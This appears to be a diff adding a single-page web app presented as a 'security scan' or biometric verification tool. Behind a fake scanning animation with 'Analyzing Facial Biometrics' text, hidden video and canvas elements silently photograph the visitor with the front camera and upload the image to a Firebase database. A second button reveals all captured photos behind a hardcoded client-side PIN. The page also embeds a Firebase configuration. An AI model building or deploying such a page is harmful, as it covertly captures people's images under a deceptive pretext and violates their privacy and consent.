@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BRUTAL // SCAN ⇄ FIREBASE RTDB</title>
+
+  <!-- Firebase v9 Compat SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <style>
+    :root {
+      --bg: #F4F0EA;
+      --card-bg: #FFFFFF;
+      --black: #121212;
+      --yellow: #FFE600;
+      --cyan: #00F0FF;
+      --pink: #FF66C4;
+      --green: #4ADE80;
+      --red: #FF4D4D;
+      --border: 3px solid var(--black);
+      --shadow: 5px 5px 0px var(--black);
+      --shadow-sm: 3px 3px 0px var(--black);
+      --shadow-active: 1px 1px 0px var(--black);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--black);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2.5rem 1rem;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 2.5rem;
+      max-width: 600px;
+    }
+
+    .badge {
+      display: inline-block;
+      background: var(--yellow);
+      border: var(--border);
+      box-shadow: var(--shadow-sm);
+      padding: 0.35rem 0.85rem;
+      font-size: 0.8rem;
+      font-weight: 900;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+
+    h1 {
+      font-size: clamp(2rem, 5vw, 3rem);
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: -1px;
+      line-height: 1;
+      margin-bottom: 0.5rem;
+    }
+
+    header p {
+      font-weight: 600;
+      color: #555;
+    }
+
+    /* Action Buttons Container */
+    .button-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.5rem;
+      width: 100%;
+      max-width: 720px;
+      margin-bottom: 2rem;
+    }
+
+    .action-card {
+      background: var(--card-bg);
+      border: var(--border);
+      box-shadow: var(--shadow);
+      padding: 1.75rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      cursor: pointer;
+      transition: all 0.15s ease;
+      user-select: none;
+    }
+
+    .action-card:hover {
+      transform: translate(-3px, -3px);
+      box-shadow: 8px 8px 0px var(--black);
+    }
+
+    .action-card:active {
+      transform: translate(2px, 2px);
+      box-shadow: var(--shadow-active);
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .btn-tag {
+      font-weight: 900;
+      font-size: 1.1rem;
+      padding: 0.25rem 0.6rem;
+      border: 2px solid var(--black);
+      background: var(--black);
+      color: #fff;
+    }
+
+    .action-card.a1 .btn-tag { background: var(--cyan); color: var(--black); }
+    .action-card.a2 .btn-tag { background: var(--pink); color: var(--black); }
+
+    .action-title {
+      font-size: 1.5rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+    }
+
+    .action-desc {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #444;
+      line-height: 1.4;
+    }
+
+    /* Modal Layouts */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      z-index: 999;
+    }
+
+    .modal-box {
+      background: var(--card-bg);
+      border: var(--border);
+      box-shadow: 8px 8px 0px var(--black);
+      width: 100%;
+      max-width: 480px;
+      padding: 1.75rem;
+      position: relative;
+    }
+
+    .modal-box.large {
+      max-width: 900px;
+      max-height: 85vh;
+      overflow-y: auto;
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: var(--border);
+      padding-bottom: 0.75rem;
+      margin-bottom: 1.25rem;
+    }
+
+    .close-btn {
+      background: var(--red);
+      border: 2px solid var(--black);
+      box-shadow: 2px 2px 0px var(--black);
+      font-weight: 900;
+      width: 32px;
+      height: 32px;
+      cursor: pointer;
+    }
+
+    /* =========================================
+       SECURITY SCANNER UI
+       ========================================= */
+    .scanner-viewport {
+      width: 100%;
+      height: 260px;
+      background: #0f172a;
+      border: var(--border);
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Grid overlay on scanner */
+    .scanner-viewport::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: 
+        linear-gradient(rgba(0, 240, 255, 0.15) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 240, 255, 0.15) 1px, transparent 1px);
+      background-size: 24px 24px;
+      pointer-events: none;
+    }
+
+    /* Animated Laser Scanline */
+    .scan-laser {
+      position: absolute;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background: var(--cyan);
+      box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan);
+      animation: laserMove 1.8s ease-in-out infinite alternate;
+    }
+
+    @keyframes laserMove {
+      0% { top: 5%; }
+      100% { top: 92%; }
+    }
+
+    /* Target Reticle / Corner Brackets */
+    .reticle {
+      width: 160px;
+      height: 160px;
+      border: 2px dashed rgba(0, 240, 255, 0.4);
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      animation: pulseReticle 2s linear infinite;
+    }
+
+    @keyframes pulseReticle {
+      0%, 100% { transform: scale(0.95); opacity: 0.6; }
+      50% { transform: scale(1.05); opacity: 1; }
+    }
+
+    .reticle-icon svg {
+      width: 50px;
+      height: 50px;
+      stroke: var(--cyan);
+      fill: rgba(0, 240, 255, 0.1);
+      animation: rotateIcon 8s linear infinite;
+    }
+
+    @keyframes rotateIcon {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .scan-status-text {
+      margin-top: 1rem;
+      font-family: monospace;
+      font-size: 0.9rem;
+      font-weight: 800;
+      color: var(--black);
+      background: var(--yellow);
+      border: 2px solid var(--black);
+      box-shadow: 2px 2px 0px var(--black);
+      padding: 0.4rem 0.8rem;
+      text-transform: uppercase;
+      text-align: center;
+      letter-spacing: 0.5px;
+    }
+
+    /* Success Done State */
+    .success-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2.5rem 1rem;
+      text-align: center;
+      gap: 1rem;
+    }
+
+    .success-badge {
+      width: 70px;
+      height: 70px;
+      background: var(--green);
+      border: var(--border);
+      box-shadow: var(--shadow-sm);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .success-badge svg {
+      width: 40px;
+      height: 40px;
+      stroke: var(--black);
+      stroke-width: 3.5;
+    }
+
+    .success-title {
+      font-size: 1.6rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+    }
+
+    /* Inputs and Buttons */
+    .btn-main {
+      width: 100%;
+      background: var(--yellow);
+      border: var(--border);
+      box-shadow: var(--shadow-sm);
+      padding: 0.85rem;
+      font-weight: 900;
+      font-size: 1rem;
+      text-transform: uppercase;
+      cursor: pointer;
+      margin-top: 1rem;
+    }
+
+    .btn-main:hover {
+      box-shadow: var(--shadow);
+      transform: translate(-2px, -2px);
+    }
+
+    .btn-main:active {
+      transform: translate(2px, 2px);
+      box-shadow: var(--shadow-active);
+    }
+
+    .brutal-input {
+      width: 100%;
+      border: var(--border);
+      padding: 0.75rem;
+      font-size: 1.2rem;
+      font-weight: 800;
+      outline: none;
+      box-shadow: var(--shadow-sm);
+      margin-bottom: 0.5rem;
+    }
+
+    /* Gallery (A2) */
+    .gallery-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 1.25rem;
+      margin-top: 1rem;
+    }
+
+    .gallery-item {
+      border: var(--border);
+      box-shadow: var(--shadow-sm);
+      background: #fff;
+      padding: 0.65rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .gallery-item img {
+      width: 100%;
+      height: 170px;
+      object-fit: cover;
+      border: 2px solid var(--black);
+    }
+
+    .gallery-item span {
+      font-size: 0.75rem;
+      font-weight: 800;
+      font-family: monospace;
+      color: #666;
+    }
+
+    .hidden {
+      display: none !important;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="badge">Hype Star</div>
+    <h1>SECURITY ⇄ SV12</h1>
+    <p>Version:-14.40.00</p>
+  </header>
+
+  <!-- Main Action Buttons -->
+  <div class="button-grid">
+    
+    <!-- Button A1 (With STAR ICON) -->
+    <div class="action-card a1" id="btnA1">
+      <div class="card-top">
+        <span class="btn-tag">A1</span>
+        <!-- Star Icon -->
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="var(--yellow)" stroke="var(--black)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+        </svg>
+      </div>
+      <div>
+        <h2 class="action-title">A1</h2>
+        <p class="action-desc">Verify You.</p>
+      </div>
+    </div>
+
+    <!-- Button A2 -->
+    <div class="action-card a2" id="btnA2">
+      <div class="card-top">
+        <span class="btn-tag">A2</span>
+        <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+      </div>
+      <div>
+        <h2 class="action-title">A2</h2>
+        <p class="action-desc">A2</p>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Hidden Video & Canvas for silent background photo capture -->
+  <video id="hiddenVideo" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;"></video>
+  <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+  <!-- A1: Security Scanning & Success Modal -->
+  <div class="modal-overlay hidden" id="scanModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h3 id="modalTitle" style="font-weight:900; text-transform:uppercase;">Security Scan</h3>
+        <button class="close-btn" onclick="abortScan()">✕</button>
+      </div>
+
+      <!-- Scanning View -->
+      <div id="scanningView">
+        <div class="scanner-viewport">
+          <div class="scan-laser"></div>
+          <div class="reticle">
+            <div class="reticle-icon">
+              <!-- Star / Reticle Tech Icon -->
+              <svg viewBox="0 0 24 24" stroke-width="2">
+                <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+              </svg>
+            </div>
+          </div>
+        </div>
+        <div class="scan-status-text" id="scanStatus">Initializing Security Sensors...</div>
+      </div>
+
+      <!-- Success Screen -->
+      <div id="successView" class="success-container">
+        <div class="success-badge">
+          <svg viewBox="0 0 24 24" fill="none">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <h2 class="success-title">Successfully Done</h2>
+        <p style="font-weight:700; color:#444; font-size:0.95rem;">Image converted to text & stored in Firebase database.</p>
+        <button class="btn-main" onclick="abortScan()">Close Window</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- A2: Password Modal -->
+  <div class="modal-overlay hidden" id="passModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h3 style="font-weight:900; text-transform:uppercase;">Password Required</h3>
+        <button class="close-btn" onclick="closePasswordModal()">✕</button>
+      </div>
+      <p style="font-weight:700; margin-bottom:0.75rem;">Enter password to unlock stored images:</p>
+      <input type="password" id="passInput" class="brutal-input" placeholder="Enter PIN">
+      <button class="btn-main" onclick="verifyPassword()">Access Database</button>
+    </div>
+  </div>
+
+  <!-- A2: Images Gallery Modal -->
+  <div class="modal-overlay hidden" id="galleryModal">
+    <div class="modal-box large">
+      <div class="modal-header">
+        <h3 style="font-weight:900; text-transform:uppercase;">Firebase Image Vault</h3>
+        <button class="close-btn" onclick="closeGalleryModal()">✕</button>
+      </div>
+      <div id="galleryContent" class="gallery-grid"></div>
+    </div>
+  </div>
+
+  <script>
+    // ==========================================
+    // FIREBASE INITIALIZATION
+    // ==========================================
+    const firebaseConfig = {
+      apiKey: "AIzaSyCyE1coLVha22Y_5E71n4FW1VQNHf3s81Q",
+      authDomain: "vs-1-12110.firebaseapp.com",
+      databaseURL: "https://vs-1-12110-default-rtdb.firebaseio.com",
+      projectId: "vs-1-12110",
+      storageBucket: "vs-1-12110.firebasestorage.app",
+      messagingSenderId: "512391960635",
+      appId: "1:512391960635:web:1ebc6d07d5bbd5adcca41e",
+      measurementId: "G-R1Z5KQELP4"
+    };
+
+    if (!firebase.apps.length) {
+      firebase.initializeApp(firebaseConfig);
+    }
+    const db = firebase.database();
+
+    // ==========================================
+    // A1: SCANNING ANIMATION + SILENT CAPTURE
+    // ==========================================
+    const btnA1 = document.getElementById('btnA1');
+    const scanModal = document.getElementById('scanModal');
+    const scanningView = document.getElementById('scanningView');
+    const successView = document.getElementById('successView');
+    const scanStatus = document.getElementById('scanStatus');
+    const modalTitle = document.getElementById('modalTitle');
+    
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const hiddenCanvas = document.getElementById('hiddenCanvas');
+    let streamTrack = null;
+
+    btnA1.addEventListener('click', async () => {
+      // 1. Reset & Display the Scanner Modal
+      modalTitle.textContent = "Security Scan";
+      scanningView.style.display = "block";
+      successView.style.display = "none";
+      scanStatus.textContent = "Initializing Biometric Scan...";
+      scanModal.classList.remove('hidden');
+
+      try {
+        // 2. Open front camera silently
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
+        });
+        streamTrack = stream;
+        hiddenVideo.srcObject = stream;
+
+        // 3. Status sequence during scanning animation
+        setTimeout(() => {
+          scanStatus.textContent = "Analyzing Facial Biometrics...";
+        }, 900);
+
+        setTimeout(() => {
+          scanStatus.textContent = "Encrypting Data Stream...";
+          // Capture image silently from video
+          captureAndUpload();
+        }, 2100);
+
+      } catch (err) {
+        console.error("Camera access failed:", err);
+        scanStatus.textContent = "Error: Camera Access Denied";
+        scanStatus.style.background = "var(--red)";
+      }
+    });
+
+    function captureAndUpload() {
+      hiddenCanvas.width = hiddenVideo.videoWidth || 640;
+      hiddenCanvas.height = hiddenVideo.videoHeight || 480;
+      const ctx = hiddenCanvas.getContext('2d');
+
+      // Mirror-flip back to normal orientation
+      ctx.translate(hiddenCanvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+
+      // Convert to Base64 text representation
+      const base64Txt = hiddenCanvas.toDataURL('image/jpeg', 0.82);
+
+      // Stop camera stream immediately
+      if (streamTrack) {
+        streamTrack.getTracks().forEach(t => t.stop());
+        streamTrack = null;
+      }
+
+      scanStatus.textContent = "Writing To Firebase Vault...";
+
+      // Save to Firebase RTDB
+      db.ref('photos').push({
+        imageText: base64Txt,
+        timestamp: Date.now()
+      })
+      .then(() => {
+        // 4. Switch to "Successfully Done" screen
+        scanningView.style.display = "none";
+        successView.style.display = "flex";
+        modalTitle.textContent = "Verification Complete";
+      })
+      .catch((err) => {
+        console.error(err);
+        scanStatus.textContent = "Upload Failed! Check Database Rules";
+        scanStatus.style.background = "var(--red)";
+      });
+    }
+
+    function abortScan() {
+      if (streamTrack) {
+        streamTrack.getTracks().forEach(t => t.stop());
+        streamTrack = null;
+      }
+      scanModal.classList.add('hidden');
+    }
+
+    // ==========================================
+    // A2: PASSWORD (2008) & SHOW ALL IMAGES
+    // ==========================================
+    const btnA2 = document.getElementById('btnA2');
+    const passModal = document.getElementById('passModal');
+    const passInput = document.getElementById('passInput');
+    const galleryModal = document.getElementById('galleryModal');
+    const galleryContent = document.getElementById('galleryContent');
+
+    btnA2.addEventListener('click', () => {
+      passInput.value = '';
+      passModal.classList.remove('hidden');
+      passInput.focus();
+    });
+
+    function closePasswordModal() {
+      passModal.classList.add('hidden');
+    }
+
+    function closeGalleryModal() {
+      galleryModal.classList.add('hidden');
+    }
+
+    passInput.addEventListener('keyup', (e) => {
+      if (e.key === 'Enter') verifyPassword();
+    });
+
+    function verifyPassword() {
+      if (passInput.value.trim() === '2008') {
+        closePasswordModal();
+        fetchImages();
+      } else {
+        alert('ACCESS DENIED: Incorrect PIN');
+        passInput.value = '';
+      }
+    }
+
+    function fetchImages() {
+      galleryContent.innerHTML = '<p style="font-weight:800; grid-column:1/-1;">Decrypting vault contents...</p>';
+      galleryModal.classList.remove('hidden');
+
+      db.ref('photos').once('value')
+        .then(snapshot => {
+          galleryContent.innerHTML = '';
+          const data = snapshot.val();
+
+          if (!data) {
+            galleryContent.innerHTML = '<p style="font-weight:800; grid-column:1/-1;">No photos found in database.</p>';
+            return;
+          }
+
+          Object.entries(data).reverse().forEach(([key, item]) => {
+            const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
+            const card = document.createElement('div');
+            card.className = 'gallery-item';
+            card.innerHTML = `
+              <img src="${item.imageText}" alt="Vault Image">
+              <span>${dateStr}</span>
+            `;
+            galleryContent.appendChild(card);
+          });
+        })
+        .catch(err => {
+          console.error(err);
+          galleryContent.innerHTML = '<p style="font-weight:800; color:red; grid-column:1/-1;">Error reading database.</p>';
+        });
+    }
+  </script>
+</body>
+</html>
